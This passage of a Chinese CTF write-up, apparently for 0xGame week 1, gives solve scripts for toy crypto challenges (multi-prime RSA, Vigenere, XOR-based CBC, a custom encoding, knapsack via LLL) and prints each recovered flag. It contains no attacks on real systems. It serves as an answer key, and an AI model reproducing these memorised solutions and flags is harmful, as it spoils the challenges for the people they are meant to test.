class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;mask = <span class="subst">&#123;mask&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"><span class="string">mask = 54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>用 <a href="http://www.factordb.com/">在线网站</a> 分解n。</p><p><img src="/0xGame-week1/c_1_1.png"></p><p>得到pq后带入常规脚本中解密。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line">n=<span class="number">93099494899964317992000886585964221136368777219322402558083737546844067074234332564205970300159140111778084916162471993849233358306940868232157447540597</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">pq=[<span class="number">2329990801</span>,<span class="number">2436711469</span>,<span class="number">2732757047</span>,<span class="number">2770441151</span>,<span class="number">2821163021</span>,<span class="number">2864469667</span>,<span class="number">2995527113</span>,<span class="number">3111632101</span>,<span class="number">3162958289</span>,<span class="number">3267547559</span>,<span class="number">3281340371</span>,<span class="number">3479527847</span>,<span class="number">3561068417</span>,<span class="number">3978177241</span>,<span class="number">4134768233</span>,<span class="number">4160088337</span>]</span><br><span class="line">c=<span class="number">54352122428332145724828674757308827564883974087400720449151348825082737474080849774814293027988784740602148317713402758353653028988960687525211635107801</span></span><br><span class="line"></span><br><span class="line">mask = <span class="number">54257528450885974256117108479579183871895740052660152544049844968621224899247</span></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pq:</span><br><span class="line">    phi*=(i-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m1//mask)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Magic_M@th_Make_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere"></a>Vigenere</h2><p>密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0dGmqk&#123;79ap4i0522g0a67m6i196he52357q60f&#125; </span><br></pre></td></tr></table></figure><p>根据flag头是<code>0xGame</code>，反推出密钥是<code>game</code>，最后找一个在线网站解密即可得到flag。</p><h2 id="密码，觅码，先有-再密"><a href="#密码，觅码，先有-再密" class="headerlink" title="密码，觅码，先有*再密"></a>密码，觅码，先有*再密</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment">#从中导入秘密的flag，这是我们要破解的信息</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="comment">#从函数库导入一些编码函数</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"><span class="comment">#hint:也许下列函数库会对你有些帮助，但是要怎么用呢……</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">flag = flag.encode()</span><br><span class="line">lent = <span class="built_in">len</span>(flag)</span><br><span class="line">flag = [flag[i*(lent//<span class="number">4</span>):(i+<span class="number">1</span>)*(lent//<span class="number">4</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]<span class="comment">#将flag切割成四份</span></span><br><span class="line"></span><br><span class="line">c1 = bytes_to_long(flag[<span class="number">0</span>])</span><br><span class="line">c2 = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">1</span>]])</span><br><span class="line">c3 = b64encode(flag[<span class="number">2</span>])</span><br><span class="line">c4 = flag[<span class="number">3</span>].<span class="built_in">hex</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1?= <span class="subst">&#123;<span class="built_in">pow</span>(c1,<span class="number">5</span>)&#125;</span>\nc2 = <span class="subst">&#123;c2&#125;</span>\nc3 = <span class="subst">&#123;c3&#125;</span>\nc4 = <span class="subst">&#123;c4&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1?= 2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line"><span class="string">c2 = 10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100</span></span><br><span class="line"><span class="string">c3 = b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line"><span class="string">c4 = e4bbace79a8443727970746fe68c91e68898e590a72121217d</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#全是乱码，那咋办嘛？</span></span><br></pre></td></tr></table></figure><p>根据源码，我们要先将c1开5次方再转成bytes，c2以8位长度位基准分割出字符，c3进行base64解码，c4进行hex解码，然后拼接起来再decode解码即可得到flag。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">c1= <span class="number">2607076237872456265701394408859286660368327415582106508683648834772020887801353062171214554351749058553609022833985773083200356284531601339221590756213276590896143894954053902973407638214851164171968630602313844022016135428560081844499356672695981757804756591891049233334352061975924028218309004551</span></span><br><span class="line">c2 = <span class="string">&quot;10010000100001101110100010100111101000111110010010111010100001101110010010111111101000011110011010000001101011111110011010011000101011111110010110100110100000101110010010111101100101011110011110111100&quot;</span></span><br><span class="line">c3 = <span class="string">b&#x27;lueggeeahO+8jOmCo+S5iOW8gOWni+aIkQ==&#x27;</span></span><br><span class="line">c4 = <span class="string">&quot;e4bbace79a8443727970746fe68c91e68898e590a72121217d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin_to_hex</span>(<span class="params">c</span>):</span><br><span class="line">    m = <span class="built_in">len</span>(c)//<span class="number">8</span></span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        str1=c[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>]</span><br><span class="line">        a = <span class="built_in">int</span>(str1,<span class="number">2</span>)</span><br><span class="line">        flag+=<span class="built_in">hex</span>(a)[<span class="number">2</span>:]</span><br><span class="line">        <span class="comment">#print(i,hex(a)[2:])</span></span><br><span class="line">        <span class="comment">#print(i,str1)</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">a2=bin_to_hex(c2)</span><br><span class="line">c11=iroot(c1,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">flag=long_to_bytes(<span class="built_in">int</span>(c11[<span class="number">0</span>]))+<span class="built_in">bytes</span>.fromhex(a2)+b64decode(c3)+<span class="built_in">bytes</span>.fromhex(c4)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h2 id="What’s-CBC"><a href="#What’s-CBC" class="headerlink" title="What’s CBC?"></a>What’s CBC?</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(text)%<span class="number">8</span>:</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">pad = <span class="number">8</span>-(<span class="built_in">len</span>(text)%<span class="number">8</span>)</span><br><span class="line">text += pad.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)*pad</span><br><span class="line"><span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">text = pad(text)</span><br><span class="line">block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">tmp = bytes_xor(iv,i)</span><br><span class="line">iv = encrypt(tmp,key)</span><br><span class="line">result += iv</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line"></span><br><span class="line">enc = (Encrypt_CBC(flag,iv,key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;enc = <span class="subst">&#123;enc&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc = b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br></pre></td></tr></table></figure><p>分析源码，可以知道这里面缺少了<code>key</code>。</p><p><code>Encrypt_CBC</code>是先将flag分成长度为8的多个字符串，然后再单独处理。每一个字符串先<code>bytes_xor(iv,i)</code>，再<code>encrypt(tmp,key)</code>并更新iv，新的iv是加密后的字符，最后再拼接起来。</p><p><code>bytes_xor</code>是将部分<code>flag</code>与<code>iv</code>异或。</p><p><code>encrypt</code>函数是将<code>text</code>的每一位的值都与<code>key</code>异或，由此推断出key是一个数字。</p><p>使用flag头<code>0xGame&#123;&#125;</code>可以推断出key为143.</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_xor</span>(<span class="params">a,b</span>):</span><br><span class="line">a,b=bytes_to_long(a),bytes_to_long(b)</span><br><span class="line"><span class="keyword">return</span> long_to_bytes(a^b)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        result += ((i^key)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_CBC</span>(<span class="params">text,iv,key</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#text = pad(text)</span></span><br><span class="line">    block=[text[_*<span class="number">8</span>:(_+<span class="number">1</span>)*<span class="number">8</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)//<span class="number">8</span>)]</span><br><span class="line">    <span class="built_in">print</span>(block)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> block:</span><br><span class="line">        iv1 = decrypt(i,key)</span><br><span class="line">        tmp = bytes_xor(iv,iv1)</span><br><span class="line">        result += tmp</span><br><span class="line">        iv=i</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">iv = <span class="string">b&#x27;11111111&#x27;</span></span><br><span class="line">key=<span class="number">143</span>   </span><br><span class="line">enc = <span class="string">b&quot;\x8e\xc6\xf9\xdf\xd3\xdb\xc5\x8e8q\x10f&gt;7.5\x81\xcc\xae\x8d\x82\x8f\x92\xd9o&#x27;D6h8.d\xd6\x9a\xfc\xdb\xd3\xd1\x97\x96Q\x1d&#123;\\TV\x10\x11&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(enc))</span><br><span class="line">flag = decrypt_CBC(enc,iv,key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;098f6bcd4621d373cade4e832627b4f6&#125;\x08\x08\x08\x08\x08\x08\x08\x08&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="猜谜"><a href="#猜谜" class="headerlink" title="猜谜"></a>猜谜</h2><p>源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">text = text.decode()</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">unpad = <span class="number">0</span></span><br><span class="line">tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">text = text[:-<span class="number">1</span>]</span><br><span class="line">unpad = -<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">text = text[:-<span class="number">2</span>]</span><br><span class="line">unpad = -<span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">tmp = tmp[:unpad]</span><br><span class="line">result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">text</span>):</span><br><span class="line">code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(<span class="built_in">bin</span>(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> text])</span><br><span class="line">length = <span class="built_in">len</span>(text)</span><br><span class="line">pad = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> length%<span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">text += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;==&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> length%<span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">text += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">pad = <span class="string">b&#x27;=&#x27;</span></span><br><span class="line">result = [code[<span class="built_in">int</span>(text[<span class="number">3</span>*i:<span class="number">3</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(text)//<span class="number">3</span>)]</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result).encode()+pad</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">flag</span>):</span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">result += (key[i%<span class="number">7</span>]^(flag[i]+i)).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = enc(encrypt(flag))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>没有密钥，拿flag头<code>0xGame&#123;</code>去推。</p><p>由<code>(key[i%7]^(flag[i]+i))</code>可以知道<code>key</code>的长度是7 。</p><p>源码自带了<code>dec</code>的源码，不用纠结<code>enc</code>了。</p><p>分析<code>encrypt</code>，可以知道加密过程是<code>移位+异或</code>。</p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">text</span>):</span><br><span class="line">    text = text.decode()</span><br><span class="line">    code = <span class="string">&#x27;AP3IXYxn4DmwqOlT0Q/JbKFecN8isvE6gWrto+yf7M5d2pjBuk1Hh9aCRZGUVzLS&#x27;</span></span><br><span class="line">    unpad = <span class="number">0</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> (text[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>) &amp; (text[-<span class="number">2</span>:] != <span class="string">&#x27;==&#x27;</span>):</span><br><span class="line">        text = text[:-<span class="number">1</span>]</span><br><span class="line">        unpad = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> text[-<span class="number">2</span>:] == <span class="string">&#x27;==&#x27;</span>:</span><br><span class="line">        text = text[:-<span class="number">2</span>]</span><br><span class="line">        unpad = -<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> text:</span><br><span class="line">        tmp += <span class="built_in">str</span>(<span class="built_in">bin</span>(code.index(i)))[<span class="number">2</span>:].zfill(<span class="number">3</span>)</span><br><span class="line">    tmp = tmp[:unpad]</span><br><span class="line">    result = long_to_bytes(<span class="built_in">int</span>(tmp,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;IPxYIYPYXPAn3nXX3IXA3YIAPn3xAYnYnPIIPAYYIA3nxxInXAYnIPAIxnXYYYIXIIPAXn3XYXIYAA3AXnx=&#x27;</span></span><br><span class="line">c = dec(c)</span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#求key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getkey</span>(<span class="params">flag</span>):</span><br><span class="line">    key=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    result=<span class="string">b&#x27;0xGame&#123;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">        key+=((flag[i]^(result[i]+i))).to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">key = getkey(c)</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">enc</span>):</span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        a = (key[i%<span class="number">7</span>]^(enc[i]))-i</span><br><span class="line">        result += a.to_bytes(<span class="number">1</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">flag = decrypt(c)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Kn0wn_pl@intext_Att@ck!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Take-my-bag"><a href="#Take-my-bag" class="headerlink" title="Take my bag!"></a>Take my bag!</h2><p>源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m</span>):</span><br><span class="line">m = <span class="built_in">str</span>(<span class="built_in">bin</span>(m))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">enc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">enc += init[i] * <span class="built_in">int</span>(m[i]) % n</span><br><span class="line"><span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line">w = getPrime(<span class="number">64</span>)</span><br><span class="line">n = getPrime(<span class="number">512</span>)</span><br><span class="line">init = [w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"></span><br><span class="line">c = encrypt(bytes_to_long(flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;w=<span class="subst">&#123;w&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">w=16221818045491479713</span></span><br><span class="line"><span class="string">n=9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line"><span class="string">c=4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>背包密码。</p><p>参考：</p><ol><li><a href="https://blog.csdn.net/m0_62506844/article/details/125795366">https://blog.csdn.net/m0_62506844/article/details/125795366</a></li><li><a href="https://blog.csdn.net/sorryagain/article/details/125067778">https://blog.csdn.net/sorryagain/article/details/125067778</a></li></ol><p>解题脚本（sage）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, bytes_to_long, inverse, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w=<span class="number">16221818045491479713</span></span><br><span class="line">n=<span class="number">9702074289348763131102174377899883904548584105641045150269763589431293826913348632496775173099776917930517270317586740686008539085898910110442820776001061</span></span><br><span class="line">c=<span class="number">4795969289572314590787467990865205548430190921556722879891721107719262822789483863742356553249935437004378475661668768893462652103739250038700528111</span></span><br><span class="line">pubkey=[w*<span class="built_in">pow</span>(<span class="number">3</span>, i) % n <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]</span><br><span class="line"><span class="comment">#print(len(pubkey))</span></span><br><span class="line"><span class="comment">#272</span></span><br><span class="line">nbit=<span class="number">512</span></span><br><span class="line"><span class="comment">#随机找一个符合条件的N</span></span><br><span class="line">N=nextprime(gmpy2.iroot(nbit,<span class="number">2</span>)[<span class="number">0</span>]//<span class="number">2</span>)</span><br><span class="line">L=Matrix(QQ,nbit + <span class="number">1</span>, nbit + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#构造矩阵L</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,i]=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[i,nbit]=pubkey[i]*N</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">    L[nbit,i]=<span class="number">1</span>/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">L[nbit,nbit]=c*N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;LLL start&quot;</span>)</span><br><span class="line">res=L.LLL()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, nbit + <span class="number">1</span>)):</span><br><span class="line">    <span class="comment"># print solution</span></span><br><span class="line">    M = res.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]<span class="comment">#最后面密文恢复后变成0</span></span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> M:</span><br><span class="line">        <span class="keyword">if</span> m != <span class="number">1</span>/<span class="number">2</span> <span class="keyword">and</span> m != -<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#根据破解原理，恢复的明文应只包含-1/2和1/2</span></span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        mm=<span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span> (i, M)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> M:</span><br><span class="line">            <span class="keyword">if</span> j==-<span class="number">1</span>/<span class="number">2</span>:<span class="comment">#不确定-1/2和1/2哪个代表二进制1</span></span><br><span class="line">                mm+=<span class="string">&quot;1&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mm+=<span class="string">&quot;0&quot;</span></span><br><span class="line">flag=mm[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(flag,<span class="number">2</span>)))</span><br><span class="line"><span class="comment">#b&#x27;0xGame&#123;Welc0me_2_Crypt0_G@me!#$&amp;%&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="数字筑基"><a href="#数字筑基" class="headerlink" title="数字筑基"></a>数字筑基</h2><p>ida32打开即可在main函数看到flag。</p><p><img 